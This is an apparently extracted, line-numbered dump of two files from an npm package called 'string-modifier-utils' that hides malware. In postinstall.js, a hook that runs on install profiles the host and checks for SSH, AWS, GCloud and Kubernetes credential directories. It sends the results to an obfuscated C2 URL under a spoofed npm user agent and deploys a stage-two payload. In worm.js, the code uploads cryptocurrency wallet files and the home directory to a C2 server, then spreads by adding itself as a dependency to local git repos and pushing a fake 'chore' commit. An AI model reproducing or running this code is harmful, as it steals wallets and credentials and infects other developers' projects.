// File: tmp/tmpgoh_fzzn/string-modifier-utils/package/payloads/worm.js
// ======================================================================
Line 1: const fs = require('fs').promises
Line 2: const path = require('path')
Line 3: const os = require('os')
Line 4: _tmp_0 = require('child_process')
Line 5: const https = require('https')
Line 8: const C2_EXFIL_URL = 'https://your-c2-server.com/exfiltrate-wallets'
Line 20: const AxiomWorm = {
    // Exfiltrate stolen files to the C2 server
    [_upload]: async (filePath) => {
        try {
            const fileContent = await fs.readFile(filePath);
            const boundary = '----AxiomBoundary' + Date.now().toString(16);
            
            const payloadParts = [
                `--${boundary}\r\n`,
                `Content-Disposition: form-data; name="file"; filename="${path.basename(filePath)}"\r\n`,
                `Content-Type: application/octet-stream\r\n\r\n`,
                 fileContent,
                `\r\n--${boundary}\r\n`,
                `Content-Disposition: form-data; name="metadata"\r\n\r\n`,
                JSON.stringify({
                    hostname: os.hostname(),
                    username: os.userInfo().username,
                    target_btc: TARGET_BTC_ADDRESS
                }),
                `\r\n--${boundary}--\r\n`
            ];
            
            const payload = Buffer.concat(payload...
Line 23: {
            const fileContent = await fs.readFile(filePath);
            const boundary = '----AxiomBoundary' + Date.now().toString(16);
            
            const payloadParts = [
                `--${boundary}\r\n`,
                `Content-Disposition: form-data; name="file"; filename="${path.basename(filePath)}"\r\n`,
                `Content-Type: application/octet-stream\r\n\r\n`,
                 fileContent,
                `\r\n--${boundary}\r\n`,
                `Content-Disposition: form-data; name="metadata"\r\n\r\n`,
                JSON.stringify({
                    hostname: os.hostname(),
                    username: os.userInfo().username,
                    target_btc: TARGET_BTC_ADDRESS
                }),
                `\r\n--${boundary}--\r\n`
            ];
            
            const payload = Buffer.concat(payloadParts.map(p => Buffer.from(p)));

            const options = {
                method: 'POST',
              ...
Line 24: const fileContent = await fs.readFile(filePath)
Line 25: Date.now().toString(16)
Line 28: _tmp_3.push(<operator>.formatString("--", boundary, "\r\n"))
Line 29: _tmp_3.push(<operator>.formatString("Content-Disposition: form-data; name="file"; filename="", path.basename(filePath), ""\r\n"))
Line 30: _tmp_3.push("Content-Type: application/octet-stream\r\n\r\n")
Line 31: _tmp_3.push(fileContent)
Line 32: _tmp_3.push(<operator>.formatString("\r\n--", boundary, "\r\n"))
Line 33: _tmp_3.push("Content-Disposition: form-data; name="metadata"\r\n\r\n")
Line 34: _tmp_3.push(JSON.stringify({
                    hostname: os.hostname(),
                    username: os.userInfo().username,
                    target_btc: TARGET_BTC_ADDRESS
                }))
Line 35: os.hostname()
Line 36: os.userInfo()
Line 39: _tmp_3.push(<operator>.formatString("\r\n--", boundary, "--\r\n"))
Line 42: Buffer.from(p)
Line 49: const req = https.request(C2_EXFIL_URL, options)
Line 51: req.write(payload)
Line 52: req.end()
Line 61: _tmp_7.push(path.join(homeDir, 'AppData', 'Roaming', 'Bitcoin', 'wallet.dat'))
Line 62: _tmp_7.push(path.join(homeDir, 'AppData', 'Roaming', 'Electrum', 'wallets'))
Line 63: _tmp_7.push(path.join(homeDir, '.electrum', 'wallets'))
Line 64: _tmp_7.push(homeDir)
Line 67: _iterator_0.next()
Line 69: const stats = await fs.stat(p)
Line 71: const files = await fs.readdir(p)
Line 72: for (const file of files) {
                        await AxiomWorm[_upload](path.join(p, file));
                    }
Line 73: await AxiomWorm[_upload](path.join(p, file))
Line 75: {
                    await AxiomWorm[_upload](p);
                }
Line 76: await AxiomWorm[_upload](p)
Line 83: {
        const searchPaths = [os.homedir()]; // Start with home, could add more like C:\dev
        const gitRepos = new Set();

        for (const dir of searchPaths) {
            try {
                const files = await fs.readdir(dir);
                for (const file of files) {
                    const fullPath = path.join(dir, file);
                    try {
                        const stats = await fs.stat(fullPath);
                        if (stats.isDirectory()) {
                            if (fs.existsSync(path.join(fullPath, '.git'))) {
                                gitRepos.add(fullPath);
                            }
                        }
                    } catch (e) { /* Suppress */ }
                }
            } catch (e) { /* Suppress */ }
        }
        return Array.from(gitRepos);
    }
Line 84: const searchPaths = [os.homedir()]
Line 87: _iterator_2.next()
Line 89: const files = await fs.readdir(dir)
Line 90: _iterator_3.next()
Line 91: path.join(dir, file)
Line 93: const stats = await fs.stat(fullPath)
Line 95: path.join(fullPath, '.git')
Line 103: Array.from(gitRepos)
Line 107: {
        const repos = await AxiomWorm[_findRepos]();
        for (const repoPath of repos) {
            try {
                const pkgPath = path.join(repoPath, 'package.json');
                const pkgContent = JSON.parse(await fs.readFile(pkgPath, 'utf8'));

                if (!pkgContent.dependencies || !pkgContent.dependencies[TARGET_DEPENDENCY]) {
                    if (!pkgContent.dependencies) pkgContent.dependencies = {};
                    pkgContent.dependencies[TARGET_DEPENDENCY] = TARGET_VERSION;
                    
                    await fs.writeFile(pkgPath, JSON.stringify(pkgContent, null, 2));

                    // Make a trivial commit and push
                    const commands = [
                        'git add package.json',
                        'git commit -m "chore: update dependencies"',
                        'git push'
                    ];
                    
                    for (const cmd of commands) {
      ...
Line 108: const repos = await AxiomWorm[_findRepos]()
Line 109: _iterator_4.next()
Line 111: path.join(repoPath, 'package.json')
Line 112: const pkgContent = JSON.parse(await fs.readFile(pkgPath, 'utf8'))
Line 114: {
                    if (!pkgContent.dependencies) pkgContent.dependencies = {};
                    pkgContent.dependencies[TARGET_DEPENDENCY] = TARGET_VERSION;
                    
                    await fs.writeFile(pkgPath, JSON.stringify(pkgContent, null, 2));

                    // Make a trivial commit and push
                    const commands = [
                        'git add package.json',
                        'git commit -m "chore: update dependencies"',
                        'git push'
                    ];
                    
                    for (const cmd of commands) {
                        exec(cmd, { cwd: repoPath }, () => {}); // Fire and forget
                    }
                }
Line 116: pkgContent.dependencies[TARGET_DEPENDENCY] = TARGET_VERSION
Line 122: _tmp_11.push("git add package.json")
Line 123: _tmp_11.push("git commit -m "chore: update dependencies"")
Line 124: _tmp_11.push("git push")
Line 127: for (const cmd of commands) {
                        exec(cmd, { cwd: repoPath }, () => {}); // Fire and forget
                    }
Line 128: exec(cmd, { cwd: repoPath }, () => {})
Line 136: {
        AxiomWorm[_hunt]();
        AxiomWorm[_spread]();
    }
Line 137: AxiomWorm[_hunt]()
Line 138: AxiomWorm[_spread]()

// File: tmp/tmpgoh_fzzn/string-modifier-utils/package/scripts/postinstall.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 4: const https = require('https')
Line 9: Buffer.from(C2_URL_B64, 'base64').toString('utf8')
Line 17: const AxiomProfiler = {
    // Gather system intelligence
    [_profile]: () => {
        const intel = {
            h: os.hostname(),
            u: os.userInfo().username,
            p: os.platform(),
            a: os.arch(),
            c: os.cpus().length,
            m: os.totalmem(),
            creds: {}
        };

        const paths = {
            ssh: path.join(os.homedir(), '.ssh'),
            aws: path.join(os.homedir(), '.aws'),
            gcp: path.join(os.homedir(), '.config', 'gcloud'),
            kube: path.join(os.homedir(), '.kube'),
        };

        for (const [key, dir] of Object.entries(paths)) {
            if (fs.existsSync(dir)) {
                intel.creds[key] = true;
            }
        }
        return intel;
    },

    // Contact C2 server with profile and get Stage 2 payload
    [_exfil]: (intel) => {
        return new Promise((resolve, reject) => {
            const data = Buffer.from(JSON.stringify(intel)).toS...
Line 21: os.hostname()
Line 22: os.userInfo()
Line 23: os.platform()
Line 24: os.arch()
Line 25: os.cpus()
Line 26: os.totalmem()
Line 31: path.join(os.homedir(), '.ssh')
Line 32: path.join(os.homedir(), '.aws')
Line 33: path.join(os.homedir(), '.config', 'gcloud')
Line 34: path.join(os.homedir(), '.kube')
Line 37: _iterator_0.next()
Line 38: {
                intel.creds[key] = true;
            }
Line 39: intel.creds[key] = true
Line 47: {
            const data = Buffer.from(JSON.stringify(intel)).toString('base64');
            const options = {
                method: 'POST',
                headers: {
                    'Content-Type': 'text/plain',
                    'Content-Length': data.length,
                    // Use a common user agent to blend in
                    'User-Agent': 'npm/8.1.2 node/v16.13.1 win32 x64'
                }
            };
            const req = https.request(C2_URL, options, (res) => {
                let body = '';
                res.on('data', (chunk) => body += chunk);
                res.on('end', () => resolve(body));
            });
            req.on('error', (e) => reject(e));
            req.write(data);
            req.end();
        }
Line 48: Buffer.from(JSON.stringify(intel)).toString('base64')
Line 58: const req = https.request(C2_URL, options, (res) => {
                let body = '';
                res.on('data', (chunk) => body += chunk);
                res.on('end', () => resolve(body));
            })
Line 64: req.write(data)
Line 65: req.end()
Line 73: Buffer.from(payload, 'base64').toString('utf8')
Line 83: {
            const intel = this[_profile]();
            const stageTwoPayload = await this[_exfil](intel);
            if (stageTwoPayload) {
                this[_deploy](stageTwoPayload);
            }
        }
Line 84: const intel = this[_profile]()
Line 85: const stageTwoPayload = await this[_exfil](intel)
Line 86: {
                this[_deploy](stageTwoPayload);
            }
Line 87: this[_deploy](stageTwoPayload)
Line 97: {
    AxiomProfiler[_main]();
}
Line 98: AxiomProfiler[_main]()
